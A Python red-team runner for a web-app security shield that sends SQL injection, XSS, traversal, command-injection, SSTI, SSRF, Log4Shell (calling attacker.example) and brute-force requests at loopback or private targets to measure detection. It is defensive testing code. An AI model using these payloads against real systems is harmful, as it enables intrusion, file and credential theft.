"""Red-team runner: prove the HTTP shield by attacking the protected app for real, over the wire.

This fires a curated, bounded set of genuine HTTP attack requests (SQL injection, XSS, path traversal, command
injection, SSTI, SSRF, a scanner sweep and a login brute force) plus benign control requests at a target web app, then
reads back what Odyssey's shield caught and blocked and how fast. It is the honest counterpart to the simulated attack
drills: the payloads really travel to the app, the app's Odyssey agent really forwards them, and the shield really
detects them - so the detection rate, block rate and time-to-detect are measured, not asserted.

SAFETY (and hackathon rules): the runner refuses any target that is not loopback or a private RFC-1918 address. It
only ever attacks a web app running on this laptop or private lab network, never a third party, and every request is
tagged in the audit trail as a red-team exercise. Nothing here scans or touches the public internet.
"""

from __future__ import annotations

import datetime as dt
import ipaddress
import socket
import time
import uuid
from urllib.parse import urlsplit

import httpx

GRACE_S = 5.0       # how long to wait for forwarded events to reach the shield after the last request


def _iso(t: dt.datetime) -> str:
    return t.astimezone(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# --- Attack catalogue ------------------------------------------------------------------------------------------
# Each case is one request. `kind` is "attack" (should be detected) or "control" (benign; must NOT be flagged, so we
# measure false positives too). `expect` is the engine family we expect, for the per-case verdict.
def _cases() -> dict[str, dict]:
    return {
        "sqli": {"title": "SQL injection", "what": "Union, boolean and time-based payloads against the product search and login.",
                 "cases": [
                     {"label": "Boolean OR 1=1", "method": "GET", "path": "/search", "query": {"q": "' OR 1=1--"}, "cwe": "CWE-89", "kind": "attack"},
                     {"label": "UNION SELECT (comment-evaded)", "method": "GET", "path": "/search", "query": {"q": "x'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"}, "cwe": "CWE-89", "kind": "attack"},
                     {"label": "Time-based (SLEEP)", "method": "GET", "path": "/product", "query": {"id": "1 AND SLEEP(5)"}, "cwe": "CWE-89", "kind": "attack"},
                     {"label": "Double-URL-encoded", "method": "GET", "path": "/search", "query": {"q": "%2527%2520OR%25201%253D1--"}, "cwe": "CWE-89", "kind": "attack"},
                     {"label": "Login bypass", "method": "POST", "path": "/login", "body": {"user": "admin'--", "pass": "x"}, "cwe": "CWE-89", "kind": "attack"},
                     {"label": "Legitimate search", "method": "GET", "path": "/search", "query": {"q": "smart meter firmware"}, "kind": "control"},
                 ]},
        "xss": {"title": "Cross-site scripting", "what": "Reflected script, event-handler and tag payloads in the search and feedback fields.",
                "cases": [
                    {"label": "<script> tag", "method": "GET", "path": "/search", "query": {"q": "<script>document.cookie</script>"}, "cwe": "CWE-79", "kind": "attack"},
                    {"label": "img onerror", "method": "GET", "path": "/search", "query": {"q": "<img src=x onerror=alert(document.domain)>"}, "cwe": "CWE-79", "kind": "attack"},
                    {"label": "svg onload (HTML-encoded)", "method": "GET", "path": "/feedback", "query": {"msg": "&#60;svg onload=alert(1)&#62;"}, "cwe": "CWE-79", "kind": "attack"},
                    {"label": "javascript: URI", "method": "POST", "path": "/feedback", "body": {"msg": "<a href=javascript:eval(atob('...'))>x</a>"}, "cwe": "CWE-79", "kind": "attack"},
                    {"label": "Ordinary feedback", "method": "POST", "path": "/feedback", "body": {"msg": "The outage map was very helpful, thanks."}, "kind": "control"},
                ]},
        "traversal": {"title": "Path traversal & file inclusion", "what": "Climb out of the web root and pull sensitive files.",
                      "cases": [
                          {"label": "../ to /etc/passwd", "method": "GET", "path": "/download", "query": {"file": "../../../../etc/passwd"}, "cwe": "CWE-22", "kind": "attack"},
                          {"label": "Encoded traversal", "method": "GET", "path": "/download", "query": {"file": "..%2f..%2f..%2fetc%2fshadow"}, "cwe": "CWE-22", "kind": "attack"},
                          {"label": "php://filter LFI", "method": "GET", "path": "/view", "query": {"page": "php://filter/convert.base64-encode/resource=config"}, "cwe": "CWE-98", "kind": "attack"},
                          {"label": "Real document", "method": "GET", "path": "/download", "query": {"file": "tariff-2026.pdf"}, "kind": "control"},
                      ]},
        "cmdi": {"title": "Command injection", "what": "Chain OS commands onto a parameter the app passes to a shell.",
                 "cases": [
                     {"label": "; cat /etc/passwd", "method": "GET", "path": "/ping", "query": {"host": "127.0.0.1; cat /etc/passwd"}, "cwe": "CWE-78", "kind": "attack"},
                     {"label": "$(id) substitution", "method": "POST", "path": "/report", "body": {"name": "meter$(id)"}, "cwe": "CWE-78", "kind": "attack"},
                     {"label": "| whoami pipe", "method": "GET", "path": "/ping", "query": {"host": "8.8.8.8 | whoami"}, "cwe": "CWE-78", "kind": "attack"},
                     {"label": "Normal diagnostics", "method": "GET", "path": "/ping", "query": {"host": "10.0.0.5"}, "kind": "control"},
                 ]},
        "inject": {"title": "Template, SSRF & Log4Shell", "what": "Server-side template evaluation, metadata SSRF and a JNDI lookup.",
                   "cases": [
                       {"label": "SSTI {{7*7}}", "method": "GET", "path": "/greet", "query": {"name": "{{7*7}}"}, "cwe": "CWE-94", "kind": "attack"},
                       {"label": "SSRF to cloud metadata", "method": "GET", "path": "/fetch", "query": {"url": "http://169.254.169.254/latest/meta-data/"}, "cwe": "CWE-918", "kind": "attack"},
                       {"label": "Log4Shell JNDI header", "method": "GET", "path": "/", "headers": {"X-Api-Version": "${jndi:ldap://attacker.example/a}"}, "cwe": "CWE-917", "kind": "attack"},
                       {"label": "Normal greeting", "method": "GET", "path": "/greet", "query": {"name": "Priya"}, "kind": "control"},
                   ]},
        "recon": {"title": "Scanner sweep & secret probing", "what": "An automated tool fingerprint plus a burst of probes for admin panels and secret files.",
                  "cases": [
                      {"label": "sqlmap User-Agent", "method": "GET", "path": "/", "headers": {"User-Agent": "sqlmap/1.8.3#stable (https://sqlmap.org)"}, "cwe": "CWE-1595", "kind": "attack"},
                      {"label": ".env probe", "method": "GET", "path": "/.env", "cwe": "CWE-200", "kind": "attack"},
                      {"label": ".git/config probe", "method": "GET", "path": "/.git/config", "cwe": "CWE-200", "kind": "attack"},
                      {"label": "wp-login probe", "method": "GET", "path": "/wp-login.php", "cwe": "CWE-1595", "kind": "attack"},
                      {"label": "phpMyAdmin probe", "method": "GET", "path": "/phpmyadmin/", "cwe": "CWE-1595", "kind": "attack"},
                      *[{"label": f"enumerate /admin/{p}", "method": "GET", "path": f"/admin/{p}", "cwe": "CWE-1595", "kind": "attack", "quiet": True}
                        for p in ("users", "config", "backup", "db", "logs", "keys", "settings", "export", "debug", "console", "shell", "old")],
                  ]},
        "bruteforce": {"title": "Credential brute force", "what": "Rapid-fire login attempts from one source, the behavioural detector's trigger.",
                       "cases": [
                           *[{"label": f"login attempt {i + 1}", "method": "POST", "path": "/login",
                              "body": {"user": "admin", "pass": pw}, "cwe": "CWE-307", "kind": "attack", "quiet": i > 0}
                             for i, pw in enumerate(["admin", "password", "123456", "admin123", "letmein", "root",
                                                     "qwerty", "P@ssw0rd", "welcome", "citypower1"])],
                       ]},
    }


def catalogue() -> list[dict]:
    return [{"id": k, "title": v["title"], "what": v["what"],
             "cases": sum(1 for c in v["cases"] if not c.get("quiet"))} for k, v in _cases().items()]


def _target_ok(base: str) -> tuple[bool, str]:
    """Allow only loopback / private targets. Resolves the host first, so 'localhost' and a LAN name both pass but a
    public domain is refused."""
    try:
        host = urlsplit(base).hostname or ""
    except ValueError:
        return False, "unparseable target URL"
    if not host:
        return False, "no host in target URL"
    if host in ("localhost", "127.0.0.1", "::1"):
        return True, host
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        try:
            ip = ipaddress.ip_address(socket.gethostbyname(host))
        except (socket.gaierror, OSError):
            return False, f"cannot resolve '{host}'"
    if ip.is_loopback or ip.is_private:
        return True, str(ip)
    return False, f"'{host}' is not a loopback or private address - the red-team runner only targets a local lab"


def run(target: str, scenario: str | None, shield) -> dict:
    """Fire one scenario (or all) at `target`, then read back what the shield caught. Blocks; call via a thread."""
    ok, detail = _target_ok(target)
    if not ok:
        raise ValueError(detail)
    cat = _cases()
    if scenario and scenario != "all" and scenario not in cat:
        raise KeyError(scenario)
    chosen = [scenario] if scenario and scenario != "all" else list(cat)
    run_id = f"RT-{dt.datetime.now(dt.timezone.utc):%H%M%S}-{uuid.uuid4().hex[:4]}"
    base = target.rstrip("/")
    started = dt.datetime.now(dt.timezone.utc)

    sent: list[dict] = []
    with httpx.Client(timeout=4.0, follow_redirects=False) as client:
        for scen in chosen:
            for i, case in enumerate(cat[scen]["cases"]):
                case_id = f"{run_id}:{scen}:{i}"
                headers = {str(k): str(v) for k, v in (case.get("headers") or {}).items()}
                headers["x-odyssey-redteam"] = run_id
                headers["x-odyssey-rt-case"] = case_id
                headers.setdefault("user-agent", headers.get("User-Agent", "Mozilla/5.0 (odyssey-redteam)"))
                url = base + case["path"]
                t0 = time.perf_counter()
                status: int | None = None
                err = None
                try:
                    r = client.request(case["method"], url, params=case.get("query"),
                                       json=case.get("body") if case["method"] != "GET" else None, headers=headers)
                    status = r.status_code
                except httpx.HTTPError as exc:
                    err = type(exc).__name__
                sent.append({"case_id": case_id, "scenario": scen, "label": case["label"], "method": case["method"],
                             "path": case["path"], "cwe": case.get("cwe"), "kind": case["kind"],
                             "quiet": case.get("quiet", False), "http_status": status, "error": err,
                             "sent_ms": round((time.perf_counter() - t0) * 1000, 1)})

    # Let the agent's background forwarder and the shield catch up.
    deadline = time.time() + GRACE_S
    want = {s["case_id"] for s in sent if s["kind"] == "attack"}
    while time.time() < deadline:
        seen = {h.get("rt_case") for h in shield.redteam_hits.get(run_id, [])}
        if want and want.issubset(seen):
            break
        time.sleep(0.25)

    hits = shield.redteam_hits.get(run_id, [])
    by_case: dict[str, dict] = {}
    for h in hits:
        c = h.get("rt_case")
        if c and (c not in by_case or _rank(h["severity"]) > _rank(by_case[c]["severity"])):
            by_case[c] = h

    cases_out, ttds = [], []
    detected = blocked = fp = 0
    for s in sent:
        h = by_case.get(s["case_id"])
        is_attack = s["kind"] == "attack"
        hit = h is not None
        if is_attack and hit:
            detected += 1
            if h["decision"] == "block":
                blocked += 1
            ttds.append(s["sent_ms"])
        if not is_attack and hit:
            fp += 1
        cases_out.append({**s, "detected": hit, "blocked": bool(h and h["decision"] == "block"),
                          "severity": h["severity"] if h else None, "category": h["category"] if h else None})

    attacks = [s for s in sent if s["kind"] == "attack"]
    controls = [s for s in sent if s["kind"] == "control"]
    finished = dt.datetime.now(dt.timezone.utc)
    report = {
        "run_id": run_id, "target": target, "scenario": scenario or "all", "started_at": _iso(started),
        "finished_at": _iso(finished), "duration_ms": round((finished - started).total_seconds() * 1000),
        "sent": len(sent), "attacks_sent": len(attacks), "controls_sent": len(controls),
        "detected": detected, "blocked": blocked, "missed": len(attacks) - detected, "false_positives": fp,
        "detection_rate": round(detected / len(attacks), 3) if attacks else None,
        "block_rate": round(blocked / len(attacks), 3) if attacks else None,
        "precision": round(detected / (detected + fp), 3) if (detected + fp) else None,
        "mean_ttd_ms": round(sum(ttds) / len(ttds), 1) if ttds else None,
        "scenarios": chosen, "cases": cases_out,
        "missed_cases": [c["label"] for c in cases_out if c["kind"] == "attack" and not c["detected"]],
        "fp_cases": [c["label"] for c in cases_out if c["kind"] == "control" and c["detected"]],
    }
    return report


def _rank(sev: str | None) -> int:
    return {"Watch": 0, "Medium": 1, "High": 2, "Critical": 3, "Compromise": 4}.get(sev or "", -1)
